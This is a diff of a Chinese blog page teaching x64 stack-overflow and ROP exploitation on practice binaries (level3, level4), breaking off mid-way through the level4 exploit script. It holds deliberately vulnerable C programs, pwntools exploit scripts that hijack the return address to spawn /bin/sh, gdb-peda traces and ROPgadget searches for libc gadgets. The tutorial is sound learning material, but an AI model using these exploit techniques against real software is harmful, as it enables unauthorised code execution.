@@ -30,7 +30,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
 
 
 <body>
@@ -400,14 +400,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        3.6k
+                        3.4k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        18 分
+                        16 分
                     </div>
                     
                 
@@ -428,7 +428,7 @@
 <li>其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上</li>
 </ul>
 <p><strong>常见寄存器</strong></p>
-<pre><code>64-bit             register Lower 32             bits Lower 16             bits Lower 8 bits
+<pre class=" language-bash"><code class="language-bash">64-bit             register Lower 32             bits Lower 16             bits Lower 8 bits
 rax             eax                         ax                         al
 rbx             ebx                         bx                         bl
 rcx             ecx                         cx                         cl
@@ -444,381 +444,403 @@ r11             r11d                         r11w                     r11b
 r12             r12d                         r12w                     r12b
 r13             r13d                         r13w                     r13b
 r14             r14d                         r14w                     r14b
-r15             r15d                         r15w                     r15b</code></pre><h2 id="2：例子–level3"><a href="#2：例子–level3" class="headerlink" title="2：例子–level3"></a>2：例子–level3</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
+r15             r15d                         r15w                     r15b</code></pre>
+<h2 id="2：例子–level3"><a href="#2：例子–level3" class="headerlink" title="2：例子–level3"></a>2：例子–level3</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 
-void callsystem()
-{
-    system(&quot;/bin/sh&quot;);
-}
+<span class="token keyword">void</span> <span class="token function">callsystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
-void vulnerable_function() {
-    char buf[128];
-    read(STDIN_FILENO, buf, 512);
-}
+<span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
-int main(int argc, char** argv) {
-    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
-    vulnerable_function();
-}</code></pre><p>关闭 stack ，pie </p>
-<pre><code>gcc -fno-stack-protector -no-pie level3.c -o level3</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>显然可以由vulnerable函数溢出控制跳转到callsystem函数就能执行system了</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import*
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>关闭 stack ，pie </p>
+<pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -no-pie level3.c -o level3</code></pre>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>显然可以由vulnerable函数溢出控制跳转到callsystem函数就能执行system了</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 
-sh = process(&#39;./level3&#39;)
-#callsystem：0x0000000000400577
-#0x000000000040044e : ret
-payload = &#39;a&#39;*136 + p64(0x000000000040044e)+p64(0x0000000000400577)
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#callsystem：0x0000000000400577</span>
+<span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000040044e</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400577</span><span class="token punctuation">)</span>
 
-#gdb.attach(sh)
-sh.sendline(payload)
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><p>知道我为啥要在跳转callsystem时加一个ret吗，因为不这样做我在本地执行会出现堆栈不能对齐的错误。</p>
-<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><pre><code>hunter@hunter:~/PWN/rop/蒸米rop/x64$ python level3.py 
-[+] Starting local process &#39;./level3&#39;: pid 7213
-[*] Switching to interactive mode
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>知道我为啥要在跳转callsystem时加一个ret吗，因为不这样做我在本地执行会出现堆栈不能对齐的错误。</p>
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ python level3.py 
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./level3'</span><span class="token keyword">:</span> pid 7213
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
 HELLO,WORLD
-\x00$  </code></pre><p><strong>可以发现X64的栈溢出控制程序转跳和X86没啥区别，就是多注意堆栈不平衡</strong></p>
+\x00$  </code></pre>
+<p><strong>可以发现X64的栈溢出控制程序转跳和X86没啥区别，就是多注意堆栈不平衡</strong></p>
 <h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><p>前面提到，x64的可用地址不能大于0x00007fffffffffff，我们用这个程序试一下’</p>
-<pre><code>from pwn import*
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 
-sh = process(&#39;./level3&#39;)
-#0x000000000040044e : ret
-payload = &#39;a&#39;*136 + &#39;AAAAAAAA&#39;
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span>
 
-gdb.attach(sh)
-sh.sendline(payload)
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><p>在gdb直接c一直执行，结果：</p>
-<pre><code>RSP: 0x7fffffffde98 (&quot;AAAAAAAA\n\337\377\377\377\177&quot;)
-RIP: 0x4005aa (&lt;vulnerable_function+32&gt;:    ret)
-R8 : 0x7ffff7dd0d80 --&gt; 0x0 
-R9 : 0x7ffff7dd0d80 --&gt; 0x0 
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>在gdb直接c一直执行，结果：</p>
+<pre class=" language-bash"><code class="language-bash">RSP: 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\n\337\377\377\377\177"</span><span class="token punctuation">)</span>
+RIP: 0x4005aa <span class="token punctuation">(</span><span class="token operator">&lt;</span>vulnerable_function+32<span class="token operator">></span>:    ret<span class="token punctuation">)</span>
+R8 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 
+R9 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 
 R10: 0x3 
 R11: 0x246 
-R12: 0x400490 (&lt;_start&gt;:    xor    ebp,ebp)
-R13: 0x7fffffffdf90 --&gt; 0x1 
+R12: 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>
+R13: 0x7fffffffdf90 --<span class="token operator">></span> 0x1 
 R14: 0x0 
 R15: 0x0
-EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-   0x4005a3 &lt;vulnerable_function+25&gt;:    call   0x400480 &lt;read@plt&gt;
-   0x4005a8 &lt;vulnerable_function+30&gt;:    nop
-   0x4005a9 &lt;vulnerable_function+31&gt;:    leave  
-=&gt; 0x4005aa &lt;vulnerable_function+32&gt;:    ret    
-   0x4005ab &lt;main&gt;:    push   rbp
-   0x4005ac &lt;main+1&gt;:    mov    rbp,rsp
-   0x4005af &lt;main+4&gt;:    sub    rsp,0x10
-   0x4005b3 &lt;main+8&gt;:    mov    DWORD PTR [rbp-0x4],edi
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffde98 (&quot;AAAAAAAA\n\337\377\377\377\177&quot;)
-0008| 0x7fffffffdea0 --&gt; 0x7fffffffdf0a --&gt; 0x8541000000000000 
-0016| 0x7fffffffdea8 --&gt; 0x100000000 
-0024| 0x7fffffffdeb0 --&gt; 0x4005f0 (&lt;__libc_csu_init&gt;:    push   r15)
-0032| 0x7fffffffdeb8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)
-0040| 0x7fffffffdec0 --&gt; 0x1 
-0048| 0x7fffffffdec8 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2f7 (&quot;./level3&quot;)
-0056| 0x7fffffffded0 --&gt; 0x100008000 
-[------------------------------------------------------------------------------]
+EFLAGS: 0x10203 <span class="token punctuation">(</span>CARRY parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
+   0x4005a3 <span class="token operator">&lt;</span>vulnerable_function+25<span class="token operator">></span>:    call   0x400480 <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>
+   0x4005a8 <span class="token operator">&lt;</span>vulnerable_function+30<span class="token operator">></span>:    nop
+   0x4005a9 <span class="token operator">&lt;</span>vulnerable_function+31<span class="token operator">></span>:    leave  
+<span class="token operator">=</span><span class="token operator">></span> 0x4005aa <span class="token operator">&lt;</span>vulnerable_function+32<span class="token operator">></span>:    ret    
+   0x4005ab <span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp
+   0x4005ac <span class="token operator">&lt;</span>main+1<span class="token operator">></span>:    mov    rbp,rsp
+   0x4005af <span class="token operator">&lt;</span>main+4<span class="token operator">></span>:    sub    rsp,0x10
+   0x4005b3 <span class="token operator">&lt;</span>main+8<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,edi
+<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
+0000<span class="token operator">|</span> 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAAAAAAA\n\337\377\377\377\177"</span><span class="token punctuation">)</span>
+0008<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x8541000000000000 
+0016<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x100000000 
+0024<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x4005f0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>
+0032<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0x7ffff7a05b97 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+231<span class="token operator">></span>:    mov    edi,eax<span class="token punctuation">)</span>
+0040<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x1 
+0048<span class="token operator">|</span> 0x7fffffffdec8 --<span class="token operator">></span> 0x7fffffffdf98 --<span class="token operator">></span> 0x7fffffffe2f7 <span class="token punctuation">(</span><span class="token string">"./level3"</span><span class="token punctuation">)</span>
+0056<span class="token operator">|</span> 0x7fffffffded0 --<span class="token operator">></span> 0x100008000 
+<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
 Legend: code, data, rodata, value
 Stopped reason: SIGSEGV
-0x00000000004005aa in vulnerable_function ()
-gdb-peda$ </code></pre><p>停在了vulnerable函数的ret，因为此时可以看到rsp里面是我们的AAAAAAAA即0x4141414141414141大于0x00007fffffffffff所以不会跳转，而是停在ret。那么我们把地址调小</p>
-<pre><code>from pwn import*
+0x00000000004005aa <span class="token keyword">in</span> vulnerable_function <span class="token punctuation">(</span><span class="token punctuation">)</span>
+gdb-peda$ </code></pre>
+<p>停在了vulnerable函数的ret，因为此时可以看到rsp里面是我们的AAAAAAAA即0x4141414141414141大于0x00007fffffffffff所以不会跳转，而是停在ret。那么我们把地址调小</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 
-sh = process(&#39;./level3&#39;)
-#0x000000000040044e : ret
-payload = &#39;a&#39;*136 + &#39;ABCDEF\x00\x00&#39;  #小端序\x00\x00会存在高地址
-#payload = &#39;a&#39;*136 + &#39;AAAAAAAA&#39;
-gdb.attach(sh)
-sh.sendline(payload)
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level3'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> <span class="token string">'ABCDEF\x00\x00'</span>  <span class="token comment" spellcheck="true">#小端序\x00\x00会存在高地址</span>
+<span class="token comment" spellcheck="true">#payload = 'a'*136 + 'AAAAAAAA'</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><p>结果：</p>
-<pre><code>RSP: 0x7fffffffdea0 --&gt; 0x7fffffffdf0a --&gt; 0x1c80000000000000 
-RIP: 0x464544434241 (&#39;ABCDEF&#39;)
-R8 : 0x7ffff7dd0d80 --&gt; 0x0 
-R9 : 0x7ffff7dd0d80 --&gt; 0x0 
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：</p>
+<pre class=" language-bash"><code class="language-bash">RSP: 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x1c80000000000000 
+RIP: 0x464544434241 <span class="token punctuation">(</span><span class="token string">'ABCDEF'</span><span class="token punctuation">)</span>
+R8 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 
+R9 <span class="token keyword">:</span> 0x7ffff7dd0d80 --<span class="token operator">></span> 0x0 
 R10: 0x3 
 R11: 0x246 
-R12: 0x400490 (&lt;_start&gt;:    xor    ebp,ebp)
-R13: 0x7fffffffdf90 --&gt; 0x1 
+R12: 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>
+R13: 0x7fffffffdf90 --<span class="token operator">></span> 0x1 
 R14: 0x0 
 R15: 0x0
-EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-Invalid $PC address: 0x464544434241
-[------------------------------------stack-------------------------------------]
-0000| 0x7fffffffdea0 --&gt; 0x7fffffffdf0a --&gt; 0x1c80000000000000 
-0008| 0x7fffffffdea8 --&gt; 0x100000000 
-0016| 0x7fffffffdeb0 --&gt; 0x4005f0 (&lt;__libc_csu_init&gt;:    push   r15)
-0024| 0x7fffffffdeb8 --&gt; 0x7ffff7a05b97 (&lt;__libc_start_main+231&gt;:    mov    edi,eax)
-0032| 0x7fffffffdec0 --&gt; 0x1 
-0040| 0x7fffffffdec8 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2f7 (&quot;./level3&quot;)
-0048| 0x7fffffffded0 --&gt; 0x100008000 
-0056| 0x7fffffffded8 --&gt; 0x4005ab (&lt;main&gt;:    push   rbp)
-[------------------------------------------------------------------------------]
+EFLAGS: 0x10203 <span class="token punctuation">(</span>CARRY parity adjust zero sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
+Invalid <span class="token variable">$PC</span> address: 0x464544434241
+<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
+0000<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x7fffffffdf0a --<span class="token operator">></span> 0x1c80000000000000 
+0008<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x100000000 
+0016<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x4005f0 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:    push   r15<span class="token punctuation">)</span>
+0024<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0x7ffff7a05b97 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main+231<span class="token operator">></span>:    mov    edi,eax<span class="token punctuation">)</span>
+0032<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x1 
+0040<span class="token operator">|</span> 0x7fffffffdec8 --<span class="token operator">></span> 0x7fffffffdf98 --<span class="token operator">></span> 0x7fffffffe2f7 <span class="token punctuation">(</span><span class="token string">"./level3"</span><span class="token punctuation">)</span>
+0048<span class="token operator">|</span> 0x7fffffffded0 --<span class="token operator">></span> 0x100008000 
+0056<span class="token operator">|</span> 0x7fffffffded8 --<span class="token operator">></span> 0x4005ab <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
 Legend: code, data, rodata, value
 Stopped reason: SIGSEGV
-0x0000464544434241 in ?? ()
-gdb-peda$ </code></pre><p>成功跳转到0x0000464544434241即 \x00\x00ABCDEF<br><strong>所以我们在ret地址的时候要注意这个问题可用地址不能大于0x00007fffffffffff</strong></p>
+0x0000464544434241 <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
+gdb-peda$ </code></pre>
+<p>成功跳转到0x0000464544434241即 \x00\x00ABCDEF<br><strong>所以我们在ret地址的时候要注意这个问题可用地址不能大于0x00007fffffffffff</strong></p>
 <h2 id="3：level4"><a href="#3：level4" class="headerlink" title="3：level4"></a>3：level4</h2><p>在leve3的基础上把后门callsystem换成一个输出system地址的函数</p>
-<h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;dlfcn.h&gt;
-void systemaddr()
-{
-    void* handle = dlopen(&quot;libc.so.6&quot;, RTLD_LAZY);
-    printf(&quot;%p\n&quot;,dlsym(handle,&quot;system&quot;));
-    fflush(stdout);
-}
+<h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span>
+<span class="token keyword">void</span> <span class="token function">systemaddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">void</span><span class="token operator">*</span> handle <span class="token operator">=</span> <span class="token function">dlopen</span><span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">,</span> RTLD_LAZY<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token function">dlsym</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
-void vulnerable_function() {
-    char buf[128];
-    read(STDIN_FILENO, buf, 512);
-}
+<span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
-int main(int argc, char** argv) {
-    systemaddr();
-    write(1, &quot;Hello, World\n&quot;, 13);
-    vulnerable_function();
-}</code></pre><p>同样关闭stack  pie  还有因为用到了dlopen，dlsym函数要加上-ldl</p>
-<pre><code>gcc -fno-stack-protector -no-pie level4.c -o level4 -ldl</code></pre><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这个程序会输出system地址那么在本地找到libc.so.6就可以计算出/bin/sh地址，再由vulnerable处的栈溢出控制程序执行system函数即可，但问题是X64函数的前6个参数依次放在对应寄存器中，对于system函数它只有一个参数（/bin/sh）那么就应该放在rdi里面。我们可以控制的只有栈中的数据，想让栈中的/bin/sh地址放到rdi中就得需要pop rdi 指令。<br>所以用ROPgadgates寻找这个指令。</p>
-<pre><code>hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary level4 --only &#39;pop|ret&#39;
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">systemaddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>同样关闭stack  pie  还有因为用到了dlopen，dlsym函数要加上-ldl</p>
+<pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -no-pie level4.c -o level4 -ldl</code></pre>
+<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>这个程序会输出system地址那么在本地找到libc.so.6就可以计算出/bin/sh地址，再由vulnerable处的栈溢出控制程序执行system函数即可，但问题是X64函数的前6个参数依次放在对应寄存器中，对于system函数它只有一个参数（/bin/sh）那么就应该放在rdi里面。我们可以控制的只有栈中的数据，想让栈中的/bin/sh地址放到rdi中就得需要pop rdi 指令。<br>所以用ROPgadgates寻找这个指令。</p>
+<pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary level4 --only <span class="token string">'pop|ret'</span>
 Gadgets information
-============================================================
-0x00000000004006d2 : pop rbp ; ret
-0x00000000004006d1 : pop rbx ; pop rbp ; ret
-0x0000000000400585 : ret
-0x0000000000400735 : ret 0xbdb8
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+0x00000000004006d2 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
+0x00000000004006d1 <span class="token keyword">:</span> pop rbx <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret
+0x0000000000400585 <span class="token keyword">:</span> ret
+0x0000000000400735 <span class="token keyword">:</span> ret 0xbdb8
 
-Unique gadgets found: 4</code></pre><p><strong>对level4文件搜寻没有看到，那么就对libc文件搜寻（本地提前准备好libc文件）</strong></p>
-<pre><code>hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary libc.so.6 --only &#39;pop|ret&#39; | grep &#39;rdi&#39;
-0x00000000000221a3 : pop rdi ; pop rbp ; ret
-0x000000000002155f : pop rdi ; ret
-0x000000000005b4fd : pop rdi ; ret 0x38</code></pre><p>找到一个：0x000000000002155f : pop rdi ; ret 。<br><strong>需要注意的是这个和在libc文件中找system，/bin/sh一样这个是偏移量，但我们不慌，知道system绝对地址就可以算出pop rid的地址.</strong></p>
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import*
-context.log_level = &#39;debug&#39;
+Unique gadgets found: 4</code></pre>
+<p><strong>对level4文件搜寻没有看到，那么就对libc文件搜寻（本地提前准备好libc文件）</strong></p>
+<pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/rop/蒸米rop/x64$ ROPgadget --binary libc.so.6 --only <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span>
+0x00000000000221a3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> pop rbp <span class="token punctuation">;</span> ret
+0x000000000002155f <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret
+0x000000000005b4fd <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret 0x38</code></pre>
+<p>找到一个：0x000000000002155f : pop rdi ; ret 。<br><strong>需要注意的是这个和在libc文件中找system，/bin/sh一样这个是偏移量，但我们不慌，知道system绝对地址就可以算出pop rid的地址.</strong></p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
 
-libc = ELF(&#39;libc.so.6&#39;)
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>
 
-binsh_offset = libc.search(&#39;/bin/sh&#39;).next() - libc.symbols[&#39;system&#39;]
-#0x000000000002155f : pop rdi ; ret
-pop_ret_offset = 0x000000000002155f - libc.symbols[&#39;system&#39;]
+binsh_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true">#0x000000000002155f : pop rdi ; ret</span>
